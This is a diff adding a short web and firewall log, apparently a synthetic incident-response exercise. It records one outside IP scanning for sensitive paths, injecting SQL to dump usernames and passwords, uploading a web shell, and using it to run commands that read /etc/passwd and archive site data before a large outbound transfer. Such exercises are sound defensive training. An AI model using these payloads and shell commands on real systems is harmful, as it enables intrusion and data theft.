@@ -1,0 +1,22 @@
+2026-11-02 01:58:12 WEB_ACCESS src_ip=192.168.100.20 method=GET uri=/index.php status=200 bytes=5120
+2026-11-02 02:03:45 WEB_ACCESS src_ip=192.168.100.31 method=GET uri=/products.php?id=4 status=200 bytes=3890
+2026-11-02 02:10:02 WEB_ACCESS src_ip=192.168.100.20 method=POST uri=/login.php status=200 bytes=1024
+2026-11-02 02:14:01 WEB_ACCESS src_ip=198.51.100.77 method=GET uri=/admin status=404 bytes=210
+2026-11-02 02:14:02 WEB_ACCESS src_ip=198.51.100.77 method=GET uri=/wp-login.php status=404 bytes=210
+2026-11-02 02:14:03 WEB_ACCESS src_ip=198.51.100.77 method=GET uri=/.env status=404 bytes=210
+2026-11-02 02:14:04 WEB_ACCESS src_ip=198.51.100.77 method=GET uri=/phpmyadmin status=404 bytes=210
+2026-11-02 02:14:05 WEB_ACCESS src_ip=198.51.100.77 method=GET uri=/backup.zip status=404 bytes=210
+2026-11-02 02:14:06 WEB_ACCESS src_ip=198.51.100.77 method=GET uri=/products.php status=200 bytes=3890
+2026-11-02 02:16:20 WEB_ACCESS src_ip=198.51.100.77 method=GET uri=/products.php?id=1' status=500 bytes=780
+2026-11-02 02:16:41 WEB_ACCESS src_ip=198.51.100.77 method=GET uri=/products.php?id=1'+OR+'1'='1 status=200 bytes=48210
+2026-11-02 02:17:09 WEB_ACCESS src_ip=198.51.100.77 method=GET uri=/products.php?id=1'+UNION+SELECT+username,password+FROM+users-- status=200 bytes=9120
+2026-11-02 02:19:33 WEB_ACCESS src_ip=198.51.100.77 method=POST uri=/upload.php status=200 bytes=420 file=shell.php
+2026-11-02 02:21:15 WEB_ACCESS src_ip=198.51.100.77 method=GET uri=/uploads/shell.php?cmd=whoami status=200 bytes=12
+2026-11-02 02:23:02 WEB_ACCESS src_ip=198.51.100.77 method=GET uri=/uploads/shell.php?cmd=cat+/etc/passwd status=200 bytes=1840
+2026-11-02 02:24:50 WEB_ACCESS src_ip=192.168.100.31 method=GET uri=/index.php status=200 bytes=5120
+2026-11-02 02:26:11 FW_ALLOW src=10.0.0.5 dst=198.51.100.77 dport=4444 proto=TCP bytes=2210
+2026-11-02 02:28:37 WEB_ACCESS src_ip=198.51.100.77 method=GET uri=/uploads/shell.php?cmd=tar+czf+/tmp/db.tgz+/var/www/data status=200 bytes=0
+2026-11-02 02:31:05 WEB_ACCESS src_ip=198.51.100.77 method=GET uri=/uploads/shell.php?cmd=ls+-la+/tmp status=200 bytes=640
+2026-11-02 02:35:44 FW_ALLOW src=10.0.0.5 dst=198.51.100.77 dport=4444 proto=TCP bytes=48230100
+2026-11-02 02:41:19 WEB_ACCESS src_ip=192.168.100.20 method=GET uri=/products.php?id=7 status=200 bytes=3900
+2026-11-02 02:52:08 WEB_ACCESS src_ip=198.51.100.77 method=GET uri=/uploads/shell.php?cmd=rm+/tmp/db.tgz status=200 bytes=0
